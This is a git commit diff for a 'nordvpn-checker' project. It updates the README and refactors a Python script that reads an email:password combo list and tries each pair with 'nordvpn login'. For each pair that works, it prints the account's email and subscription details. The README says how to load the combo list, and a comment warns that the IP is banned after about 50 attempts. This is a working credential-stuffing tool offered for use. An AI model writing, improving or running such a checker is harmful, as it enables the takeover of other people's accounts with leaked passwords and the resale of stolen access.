bf8f799758654c1d2856f44e126c20284aa1c3df
behnambm <behnam.mohamadzadeh21@gmail.com>
2019-12-25 19:56:07 +0330

    update README and rename checker file

--- README.md
+++ README.md
@@ -1,7 +1,19 @@
 # nordvpn-checker
-A simple script to check NordVpn login 
+A simple script to check NordVpn accounts.(Only in linux) 
 ___
 #### You should have NordVpn installed to check your combo list:
-`$ sudo apt install nordvpn`
+- [How to install NordVPN on your system](https://nordvpn.com/download/linux/)
+- Your combo list must have followed this pattern:
+ `email:password`
+- In 5th line of **nordvpn-checker.py** file you just need to replace your email-pass file path to the **open()** function:
+ `handle = open('your-email-pass-file.txt')`
+- At last just run the code:
+    `$ python3 nord-checker.py`
+    
+## TODO 
+- [ ] make a better REAMDME.md file with a better English :)
 
-[My Telgram](https://t.me/behnam_1121)
+## Contact 
+
+- [My Telgram](https://t.me/behnam_1121)
+- [My Instagram](https://www.instagram.com/behnam.mohamadzadeh)
--- nord-checker.py
+++ nord-checker.py
@@ -1,4 +1,6 @@
-import os,subprocess,time
+import os
+import subprocess
+import time
 
 handle = open('your-email-pass-file.txt')    # import your combo file (email:pass)
 
@@ -7,17 +9,20 @@ for line in handle:
     count += 1
     user , pas = line.strip().split(':')    # your combo file must be separated by colon : 
     res  = os.system('nordvpn login -u {} -p {}'.format(user,pas))
-    data = None
-    if res == 0:
-        data = str(subprocess.check_output(['nordvpn','account'],encoding='437'))
-        data = data.split('Account Information:')[1]
-        data = data.split('Email Address: ')[1]
-        email , data = data.split('VPN Service: ')
-        print(str(count)+'-' ,user+':'+pas+'\t'+data)
+    info = None
+
+    if res == 0:  # 0 means that there is no error
+        info = str(subprocess.check_output(['nordvpn','account'],encoding='437'))
+        info = info.split('Account Information:')[1]
+        info = info.split('Email Address: ')[1]
+        email , info = info.split('VPN Service: ')
+        print(str(count)+'-' ,user+':'+pas+'\t'+info)
         os.system('nordvpn logout')
         print()
+
     else:
-        print(str(count)+'- '+user+':'+pas+'\t'+str(data)+'\n')
+        print(str(count)+'- '+user+':'+pas+'\t'+str(info)+'\n')
+
     if count == 50: # you can change the count but almost after 50 try your IP will ban from Nord servers
         handle.close()
         print(f"We reached to {count} login")
